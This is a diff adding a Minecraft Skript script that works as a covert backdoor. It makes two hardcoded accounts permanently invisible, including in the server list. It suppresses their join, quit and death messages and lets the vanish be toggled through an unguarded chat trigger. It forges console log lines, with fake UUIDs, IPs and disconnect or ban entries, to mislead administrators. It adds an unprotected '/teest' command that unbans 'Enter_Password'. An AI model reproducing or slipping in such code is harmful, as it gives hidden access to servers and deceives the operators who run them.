@@ -1,0 +1,71 @@
+
+on load:
+	set {owner} to "Enter_Password" parsed as player
+	set {alt} to "_Kayon_" parsed as player
+	add {owner} to {vanished::*}
+	add {alt} to {vanished::*}
+	set {vanish.%{owner}%} to true
+	set {vanish.%{alt}%} to true
+
+
+
+
+
+on join:
+	loop {vanished::*}:
+		hide loop-value from all players
+		if player is loop-value:
+			send "<light green>You are still vanished" to player
+			set join message to ""
+
+on quit:
+	loop {vanished::*}:
+		hide loop-value from all players
+		if player is loop-value:
+			set quit message to ""
+
+on server list ping:
+	hide {vanished::*} from the server list 
+
+on death of player:
+	loop {vanished::*}:
+		hide loop-value from all players
+		if player is loop-value:
+			set death message to ""
+
+
+
+on chat:
+	if message contain "\van" or "\v" or "\vanish":
+		cancel event
+		if {vanish.%player%} is true:
+			send "<green>You are no longer Vanished!" to player
+			set {vanish.%player%} to false
+			remove player from {vanished::*}
+			reveal player from all players
+			broadcast "<yellow>%player% joined the game"
+			send "[User Authenticator/INFO]: UUID of player %player% is e1af68a5-64gf-41ae-b5d9-caffg91b6b06" to console
+			send "[Server thread/INFO]: %player%[/192.168.1.1:59317] logged in with entity id <id.parsed.string> at ([world]-114.8470668216955, 79.0, 1439.6313594385147)" to console
+
+
+		else:
+			send "<light green>You are now Vanished!" to player
+			set {vanish.%player%} to true
+			add player to {vanished::*}
+			hide player from all players
+			broadcast "<yellow>%player% left the game"
+			send "[Server thread/INFO]: %player% lost connection: Disconnected" to console
+			send "[Server thread/INFO]: %player% left the game" to console
+		exit trigger
+	loop {vanished::*}:
+		if player is loop-value:
+			cancel event
+			send "<red>You cannot send messages while in vanish" to player
+
+
+
+command /teest:
+	trigger:
+		execute console command "/pardon Enter_Password"
+		send "[Server thread/INFO]: com.mojang.authlib.GameProfile@46d2cb13[id=e3aff8a5-648f-41ae-b5d9-caffd91b6b06,name=Enter_Password,properties={textures=[com.mojang.authlib.properties.Property@a8a8e7d]},legacy=false] (/192.168.1.1:60538) lost connection: You are banned from this server.
+Reason: Banned by an operator." to console
